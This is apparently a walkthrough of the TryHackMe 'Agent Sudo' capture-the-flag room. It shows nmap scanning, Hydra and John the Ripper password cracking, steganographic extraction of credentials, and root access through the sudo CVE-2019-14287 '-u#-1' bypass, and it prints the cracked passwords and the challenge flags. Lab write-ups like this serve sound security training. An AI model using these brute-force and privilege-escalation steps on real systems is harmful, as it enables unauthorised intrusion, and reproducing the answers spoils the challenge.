# **Agent Sudo Guide**

This guide outlines the process of investigating and extracting information from an FTP server and uncovering hidden data using various tools in a Kali Linux environment.

---

<br>

## **Initial Setup**

Before starting the steps below, an IP address was configured in the `/etc/hosts` file to simplify command usage. This was done with the following command:

```bash
sudo nano /etc/hosts
```

The following entry was added:

```
10.10.53.46     agent.thm
```

Using this method, commands in the following steps refer to `agent.thm` instead of the IP address. However, this is optional. As an alternative, you can:

- Use the target machine's IP directly in the commands.
- Export the IP to a variable and reference it in the commands:

```bash
export IP=10.10.53.46
```

Commands can then use `$IP` as a reference, e.g., `ssh user@$IP`.

---

<br><br>

## **Step 1: Nmap Scan Results**

To identify available services and potential entry points, I ran an **Nmap** scan with the following command:

```bash
nmap --min-rate 4000 -Pn -sV -sC -oN nmap/initial agent.thm
```

### Nmap Scan Output
```
# Nmap 7.94SVN scan initiated Fri Mar 21 21:49:45 2025 as: nmap --min-rate 4000 -Pn -sV -sC -oN nmap/initial agent.thm
Nmap scan report for agent.thm (10.10.19.189)
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 21 21:50:10 2025 -- 1 IP address (1 host up) scanned in 25.19 seconds
```

### Key Findings
- **Port 21 (FTP)**: Running `vsftpd 3.0.3`.
- **Port 22 (SSH)**: Running `OpenSSH 7.6p1`.
- **Port 80 (HTTP)**: Running `Apache 2.4.29`.

### Next Step: Exploring the HTTP Service
Upon navigating to the web page hosted on port 80, a message was discovered that read:

> **Dear agents,**  
> Use your own codename as user-agent to access the site.  
> **From, Agent R**

This clue indicated that a custom **`User-Agent`** string should be used to access specific content on the website.

---

<br><br>

## **Step 2: Run [`agent.py`](/scripts/python/agent.py) Script**

After accessing the web page and reading the message, the phrase `From, Agent R` could indicate a pattern for codenames using uppercase letters of the alphabet.

This clue suggested that the correct User-Agent should match an agent's codename in **uppercase** format (e.g., "R"). To automate the testing of different codenames, the [**`agent.py`**](/scripts/python/agent.py) script was created.

This script iterates through all uppercase letters from A to Z as potential codenames. For each attempt:

- If the response contains `<html>`, the attempt is considered unsuccessful.  
- If no HTML is detected, it indicates a possible correct `User-Agent`.  
- The successful response is saved to a file named `agent_message.txt`.  

To run the script, use the following command:  

```bash
python3 agent.py
```

This method efficiently automates the process of identifying the correct `User-Agent` by following the hint provided on the web page.

<br>

**Terminal Output:**
```
❌ Attempt with user-agent: A - HTML response detected
❌ Attempt with user-agent: B - HTML response detected
✅ Possible user-agent found: C
❌ Attempt with user-agent: D - HTML response detected
❌ Attempt with user-agent: E - HTML response detected
❌ Attempt with user-agent: F - HTML response detected
❌ Attempt with user-agent: G - HTML response detected
❌ Attempt with user-agent: H - HTML response detected
❌ Attempt with user-agent: I - HTML response detected
❌ Attempt with user-agent: J - HTML response detected
❌ Attempt with user-agent: K - HTML response detected
❌ Attempt with user-agent: L - HTML response detected
❌ Attempt with user-agent: M - HTML response detected
❌ Attempt with user-agent: N - HTML response detected
❌ Attempt with user-agent: O - HTML response detected
❌ Attempt with user-agent: P - HTML response detected
❌ Attempt with user-agent: Q - HTML response detected
❌ Attempt with user-agent: R - HTML response detected
❌ Attempt with user-agent: S - HTML response detected
❌ Attempt with user-agent: T - HTML response detected
❌ Attempt with user-agent: U - HTML response detected
❌ Attempt with user-agent: V - HTML response detected
❌ Attempt with user-agent: W - HTML response detected
❌ Attempt with user-agent: X - HTML response detected
❌ Attempt with user-agent: Y - HTML response detected
❌ Attempt with user-agent: Z - HTML response detected

📄 Message saved to 'agent_message.txt' 
```
---

<br><br>

## **Step 3: Crack FTP Password with Hydra**

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent.thm
```

**Terminal Output:**
```
[21][ftp] host: agent.thm   login: chris   password: crystal
```

**Password Found:** `crystal`

---

<br><br>

## **Step 4: Connect to FTP Server and Download Files**

```bash
ftp agent.thm 21
```

**FTP Commands:**
```
ftp> ls -la
ftp> mget *
```

<br>

**Terminal Output:**
```
Connected to agent.thm.
220 (vsFTPd 3.0.3)
Name (agent.thm:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||53819|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||8914|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**************************************************************************************************************************|   217        4.22 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.65 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||7753|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |**************************************************************************************************************************| 33143       98.88 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (49.92 KiB/s)
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||33387|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |**************************************************************************************************************************| 34842      103.60 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (51.76 KiB/s)
ftp> 
```

---

<br><br>

## **Step 5: Analyze Binary File with Binwalk**

```bash
binwalk -e --run-as=root cutie.png
```
Binwalk is a tool that analyzes binary files to identify and extract hidden data such as images, embedded file systems, firmware, and other types of data.

### File Analysis

Binwalk examined the file `cutie.png` byte by byte, searching for known **signatures** of different file formats (such as ZIP, JPEG, PNG, TAR, etc.) that may be embedded in the main file.

### Hidden Content Extraction

When using the `-e` flag, Binwalk automatically extracts the identified data and saves it in a directory named after the original file followed by `_cutie.png.extracted`.


**Extracted Files:**
```
365  365.zlib  8702.zip
```

**Now you need a password to get access the zip file**

---

<br><br>

## **Step 6: Crack ZIP Password with John the Ripper**

1. Extract the hash from the ZIP file:
```bash
zip2john 8702.zip > hashes_for_john.txt
```

2. Crack the password using John:
```bash
/usr/sbin/john hashes_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<br>

**Terminal Output:** 
```
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2025-03-22 22:26) 0.6666g/s 16384p/s 16384c/s 16384C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


**Password Found:** `alien`

---

<br><br>

## **Step 7: Now you can return to zip file and get access using the cracked password**

To extract the zip file:
```bash
7z e 8702.zip
```

<br>

**Terminal Output:**
```
7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 09:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 09:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280
```

<br>

## ***7-Zip Extraction Explanation***

- **Command Used:** `7z e 8702.zip`  
- The `e` option extracts files directly to the current directory. 
- The tool identified the file `8702.zip` with a size of `280 bytes`.   

<br>

### Password Prompt
- The ZIP file required a password, which was entered securely (not displayed on the screen).  

<br>

### Result
- The message **"Everything is Ok"** confirms that the extraction was successful.

<br>

### Now you can read the
- **Now you can read the ***`To_agentR.txt`*** file:**  
    ```
    cat To_agentR.txt
    ```

    **Result:**
    ```
    Agent C,

    We need to send the picture to 'QXJlYTUx' as soon as possible!

    By,
    Agent R
    ```

<br>

## ***Base64 Decoding Process Explanation***

Base64 is an encoding technique that converts binary data into an ASCII-readable format, using a 64-character table. This encoding is commonly used for transferring binary data through systems that handle only text. The Base64 decoding process reverses this conversion, transforming the encoded string back into its original form.

<br>

### **Command Used:**
```bash
echo QXJlYTUx | base64 -d
```

- **echo QXJlYTUx**: The `echo` command is used to print the Base64-encoded string, which in this case is `QXJlYTUx`. This string represents the Base64 encoding of the text "Area51".

- **| (pipe)**: The pipe (`|`) is used to pass the output of the `echo` command as input to the next command. It sends the result of `echo QXJlYTUx` directly to the `base64 -d` command.

- **base64 -d**: The `base64` command is used for encoding or decoding data. The `-d` (or `--decode`) option specifies that the operation should be decoding. It converts the Base64 input back to its original form, which in this case is the text `Area51`.

<br>

### **Decoded Output:**
```bash
Area51
```

Executing this command results in the decoded output, which is the original text "Area51" that was encoded in Base64 as `QXJlYTUx`. The Base64 decoding process reverses this encoding, allowing you to retrieve the original content.

---

<br><br>

## **Step 8: Extract Hidden Data with `steghide`**

```bash
steghide extract -sf cute-alien.jpg
```

**Password for Extraction:** `Area51`

**Extracted File:** `message.txt`

<br>

**Content:**
>Hi ***`James`***
>
>Glad you found this message. **Your login password is ***`hackerrules!`*****
>
>Don't ask me why the password looks cheesy, ask agent...

---

<br><br>

## **Step 9: SSH Access and Initial Investigation**

After extracting the credentials, use SSH to connect to the target system.

### Connecting via SSH
To connect as user `james`, run the following command:

```bash
ssh james@agent.thm
```

**Terminal Output:**
```
james@agent.thm's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

System information as of Sun Mar 23 08:32:40 UTC 2025

System load:  0.08              Processes:           92
Usage of /:   39.7% of 9.78GB   Users logged in:     0
Memory usage: 31%               IP address for eth0: 10.10.159.50
Swap usage:   0%

75 packages can be updated.
33 updates are security updates.

Last login: Tue Oct 29 14:26:27 2019
```
<br>

### Exploring the User Directory
Once logged in, list the contents of the home directory:

```bash
ls -la
```

**Output:**
```
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
```

<br>

### Reading the `user_flag.txt`
To view the contents of the `user_flag.txt` file:

```bash
cat user_flag.txt
```

**Output:**
```
b03d975e8c92a7c04146cfa7a5a313c7
``` 
<br>

✅ Successfully accessed the system and retrieved the user flag!

---

<br><br>

## **Step 10: Secure Copy (SCP) to Retrieve Evidence**

After identifying the file `Alien_autospy.jpg` in James' home directory, you can securely copy it to your local machine using SCP.

### SCP Command to Download the File
To download the file, run the following command:

```bash
scp james@agent.thm:/home/james/Alien_autospy.jpg .
```

**Terminal Output:**
```
james@agent.thm's password:
Alien_autospy.jpg
```

The file `Alien_autospy.jpg` will now be available in your current working directory.

### What is the incident of the photo called? **Roswell alien autopsy**

<br>

✅ Successfully retrieved the `Alien_autospy.jpg` file for further analysis.

---

<br><br>

## **Step 11: Exploit Sudo Vulnerability (CVE-2019-14287)**

### Exploit Script Execution

To gain further access to the system by exploiting a vulnerability in `sudo` (CVE-2019-14287), the following steps were carried out:

-    **1. Create the Exploit Script**  
      The exploit script `exploit.sh` was created with the following command:

      ```bash
      nano exploit.sh
      ```

<br>

-    **2. List Directory Contents**  
      The contents of the current directory were listed to verify the presence of the script and other files:

      ```bash
      ls
      ```

      Output:

      ```bash
      Alien_autospy.jpg  exploit.sh  user_flag.txt
      ```
<br>

-    **3. Change Script Permissions**  
      The script was made executable by changing its permissions:

      ```bash
      chmod 777 exploit.sh
      ```
<br>

-    **4. Run the Exploit Script**  
      The script was executed to attempt the privilege escalation:

      ```bash
      ./exploit.sh
      ```

      Output:

      ```bash
      [-] This user has sudo rights
      [-] Checking sudo version
      [-] This sudo version is vulnerable
      [-] Trying to exploit
      ```
<br>

## ***[`Exploit`](/scripts/shell/exploit.sh) Description***

The exploit targets a vulnerability in the `sudo` command known as **CVE-2019-14287**. This vulnerability occurs when specific configurations in `sudo` allow a user with limited privileges to execute commands as `root`, bypassing typical security restrictions.

### CVE Reference: CVE-2019-14287
This vulnerability allows a user to execute commands as a superuser when `sudo` is misconfigured to allow commands with a restricted user. By exploiting this flaw, an attacker can escalate privileges and gain `root` access.

<br>

### Analysis and Script Behavior
The exploit script is designed to:
1. **Check for `sudo` Permissions:** The script verifies if the current user has `sudo ALL` permissions, which already grants unrestricted `root` access. If found, no further exploitation is needed.
2. **Identify Restricted `sudo` Rights:** If the user has limited `sudo` rights, the script identifies the vulnerable executable that can be exploited.
3. **Check `sudo` Version:** The script verifies if the `sudo` version is vulnerable by comparing it to the known vulnerable version (`< 1.8.28`).
4. **Exploit Execution:** If the version is confirmed as vulnerable, the script attempts to escalate privileges using the command:

```bash
sudo -u#-1 /path/to/vulnerable_program
```

This bypasses normal security checks by exploiting the vulnerability's flaw in handling the `-u#-1` parameter, which effectively runs the command as `root`.

<br>

### CVE Selection Explanation
The CVE-2019-14287 vulnerability was identified after analyzing the `sudo` version on the target machine (`1.8.21p2`). This version is confirmed to be affected by the vulnerability, which impacts all `sudo` versions prior to `1.8.28`. This vulnerability was chosen as it aligns with the intended challenge in the TryHackMe CTF.

For more details, refer to the [**`exploit.sh`**](/scripts/shell/exploit.sh) script in this repository and [**`CVE-2019-14287`**](https://github.com/n0w4n/CVE-2019-14287.git) repository.

---

<br><br>

## **Step 12: Gaining Root Access**

After successfully exploiting the `sudo` vulnerability (CVE-2019-14287), root access was achieved. The next steps involved navigating the filesystem and locating the flag `root.txt` to complete the challenge.

<br>

### Navigating the Filesystem

Once we gained root privileges, we started by navigating to the root directory:

```bash
root@agent-sudo:~# cd /
```

Listing the contents of the root directory:

```bash
root@agent-sudo:/# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
```

The `root` directory was found and we navigated to it:

```bash
root@agent-sudo:/# cd root
root@agent-sudo:/root# ls
root.txt
```

<br>

### Reading the Flag

The file `root.txt` was located inside the `/root` directory. We displayed its contents with the following command:

```bash
root@agent-sudo:/root# cat root.txt
```

<br>

**Content:**
>To Mr.hacker,
>
>Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
>
>**Your flag is**  
***`b53a02f55b57d4439e3341834d70c062`***
>
>By,
>***`DesKel`*** a.k.a Agent R

<br>

### Conclusion

The `root.txt` file contains the final flag required to complete this challenge: `b53a02f55b57d4439e3341834d70c062`. Additionally, it reveals the identity behind Agent R: `Deskel`. By exploiting the `sudo vulnerability (CVE-2019-14287)`, root access was successfully gained, allowing the flag to be retrieved.